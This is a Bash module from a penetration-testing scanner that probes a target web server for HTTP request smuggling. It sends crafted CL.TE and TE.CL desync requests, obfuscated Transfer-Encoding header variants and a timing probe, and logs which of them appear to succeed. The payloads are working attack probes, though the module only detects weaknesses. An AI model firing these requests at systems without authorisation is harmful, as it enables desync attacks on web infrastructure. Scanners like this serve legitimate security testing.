#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === HTTP SMUGGLING ===
# 36. HTTP REQUEST SMUGGLING v2 (CL.TE + TE.CL + Desync Detection)
run_http_smuggling() {
    if check_dependency "$OUT_DIR/vulns/http_smuggling.txt" "HTTP Smuggling"; then return; fi
    log_phase "HTTP REQUEST SMUGGLING v2 (DESYNC ANALYSIS)"
    
    mkdir -p "$OUT_DIR/.temp" "$OUT_DIR/vulns"
    : > "$OUT_DIR/vulns/http_smuggling.txt"
    local finding_count=0
    
    # ── STEP 1: BASELINE REQUEST ──
    log_step "Establishing baseline response..."
    
    local base_url="https://$TARGET"
    local baseline_status=$(curl -sI --max-time 10 -o "$OUT_DIR/.temp/smuggle_baseline.tmp" -w "%{http_code}" "$base_url" 2>/dev/null || echo "000")
    local baseline_length=$(wc -c < "$OUT_DIR/.temp/smuggle_baseline.tmp" 2>/dev/null || echo 0)
    
    if [ "$baseline_status" = "000" ]; then
        log_warn "Target unreachable. Skipping smuggling tests."
        return
    fi
    
    log_stat "Baseline" "$baseline_status ($baseline_length bytes)"
    
    # ── STEP 2: CL.TE DESYNC TEST ──
    log_step "Testing CL.TE desync (Content-Length > Transfer-Encoding)..."
    
    # Send CL.TE: server using CL gets smuggled "GPOST" prefix
    local clte_resp=$(curl -s --max-time 15 -o "$OUT_DIR/.temp/clte_resp.tmp" -w "%{http_code}" \
        -X POST "$base_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 6" \
        -H "Transfer-Encoding: chunked" \
        --data-raw $'0\r\n\r\nG' \
        2>/dev/null || echo "000")
    
    # If we get a different response than baseline, possible desync
    if [ "$clte_resp" != "$baseline_status" ] && [ "$clte_resp" != "000" ] && [ "$clte_resp" != "400" ]; then
        echo "[HIGH] CL.TE DESYNC POSSIBLE: $base_url (response: $clte_resp vs baseline: $baseline_status)" >> "$OUT_DIR/vulns/http_smuggling.txt"
        echo "  → Server may process Content-Length while proxy uses Transfer-Encoding" >> "$OUT_DIR/vulns/http_smuggling.txt"
        finding_count=$((finding_count + 1))
    fi
    
    # ── STEP 3: TE.CL DESYNC TEST ──
    log_step "Testing TE.CL desync (Transfer-Encoding > Content-Length)..."
    
    local tecl_resp=$(curl -s --max-time 15 -o "$OUT_DIR/.temp/tecl_resp.tmp" -w "%{http_code}" \
        -X POST "$base_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Content-Length: 3" \
        -H "Transfer-Encoding: chunked" \
        --data-raw $'8\r\nSMUGGLED\r\n0\r\n\r\n' \
        2>/dev/null || echo "000")
    
    if [ "$tecl_resp" != "$baseline_status" ] && [ "$tecl_resp" != "000" ] && [ "$tecl_resp" != "400" ]; then
        echo "[HIGH] TE.CL DESYNC POSSIBLE: $base_url (response: $tecl_resp vs baseline: $baseline_status)" >> "$OUT_DIR/vulns/http_smuggling.txt"
        echo "  → Server may process Transfer-Encoding while proxy uses Content-Length" >> "$OUT_DIR/vulns/http_smuggling.txt"
        finding_count=$((finding_count + 1))
    fi
    
    # ── STEP 4: TE.TE OBFUSCATION TEST ──
    log_step "Testing TE.TE obfuscation variants..."
    
    local te_variants=(
        "Transfer-Encoding: xchunked"
        "Transfer-Encoding : chunked"
        "Transfer-Encoding: chunked"$'\r'"Transfer-Encoding: x"
        "Transfer-encoding: cow"
        "Transfer-Encoding: chunked"$'\n'"X: X"$'\n'"Transfer-Encoding: chunked"
    )
    
    for te_header in "${te_variants[@]}"; do
        local te_resp=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
            -X POST "$base_url" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "$te_header" \
            -H "Content-Length: 4" \
            --data-raw $'0\r\n\r\n' \
            2>/dev/null || echo "000")
        
        if [ "$te_resp" = "200" ] || [ "$te_resp" = "405" ]; then
            echo "[MEDIUM] TE OBFUSCATION ACCEPTED: $base_url" >> "$OUT_DIR/vulns/http_smuggling.txt"
            echo "  → Header variant: $(echo $te_header | head -c 60) → $te_resp" >> "$OUT_DIR/vulns/http_smuggling.txt"
            finding_count=$((finding_count + 1))
            break
        fi
    done
    
    # ── STEP 5: FRONT-END/BACK-END DESYNC TIMING ──
    log_step "Testing request timing for desync indicators..."
    
    # If server hangs on split request, possible desync
    local start_time=$(date +%s)
    curl -s --max-time 10 -o /dev/null \
        -X POST "$base_url" \
        -H "Content-Length: 100" \
        -H "Transfer-Encoding: chunked" \
        --data-raw $'0\r\n\r\n' \
        2>/dev/null || true
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    if [ "$duration" -ge 8 ]; then
        echo "[HIGH] REQUEST TIMEOUT DESYNC: $base_url (request hung for ${duration}s)" >> "$OUT_DIR/vulns/http_smuggling.txt"
        echo "  → Server may be waiting for remaining Content-Length bytes (desync indicator)" >> "$OUT_DIR/vulns/http_smuggling.txt"
        finding_count=$((finding_count + 1))
    fi
    
    
    
    rm -f "$OUT_DIR/.temp/smuggle_baseline.tmp" "$OUT_DIR/.temp/clte_resp.tmp" "$OUT_DIR/.temp/tecl_resp.tmp"
    
    log_stat "HTTP Smuggling Findings" "$finding_count"
    log_success "HTTP Smuggling Analysis v2 completed."
}

